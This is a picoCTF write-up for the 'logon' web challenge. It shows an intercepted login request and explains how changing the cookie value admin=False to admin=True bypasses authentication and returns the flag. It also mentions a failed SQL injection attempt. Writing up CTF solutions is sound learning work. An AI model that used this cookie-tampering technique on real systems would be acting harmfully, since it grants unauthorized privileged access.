# Challange Info

Name : logon

Difficulty : Easy

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/46?category=1&page=1

# Writeup

Navigating the webpage https://jupiter.challenges.picoctf.org/problem/44573/. We get basic login form.

The description says we have to try logging in as Joe so i tried SQLi but that didn't work.

Then I opened burpsuite and intercepted login request.

```
POST /login HTTP/1.1

Host: jupiter.challenges.picoctf.org

Cookie: cf_clearance=pqMz88pI6BdkALVBQWGxjdpEN89YnSYEXQXuxQmuzhM-1735069988-1.2.1.1-pGru89FnC8BEgokS4LYGoOOwuMGAvNUn4urWW4K45ntzXvs7pzhyctedjYPMq_CNPhD7gi3G9j8CWgoxLkt55UQxlILoIv8e_MQJg48wtzq5Pb3UEGkI83NjWm2DyAs7D3KHDI48_3bbMcYvRlzvgS1kB_CsU8uciDnvhAESf_3vYKovtdvVaY0THEPxqISIK.Hs0qqFMu5XIm70Z793xy.QSVfzASE.BU.PrdYeTP7lwlPHGSNeqFm7e1DFvyM8KJZnWyaarIPBx1VxY0d1OxrJKIU6zPb9elvVmdWyXpQ92xWpevORE5cPeazvLXdB68.wEyTNdmOEWPINqDQsa_09lZwkGkqKWwZ.liz9xzls2Cz4nv3IFSWPDAh.AUsm; password=pass; username=admin; admin=False

Content-Length: 19

Cache-Control: max-age=0

Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Origin: https://jupiter.challenges.picoctf.org

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://jupiter.challenges.picoctf.org/problem/44573/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Sec-Gpc: 1

Priority: u=0, i

Connection: keep-alive



user=admin&password=pass
```

In the end of cookie section there are three parameters.

```
password=pass; username=admin; admin=False
```

Setting `admin=False` to `admin=True`.

And forwarding the request in response webpage we get our flag.
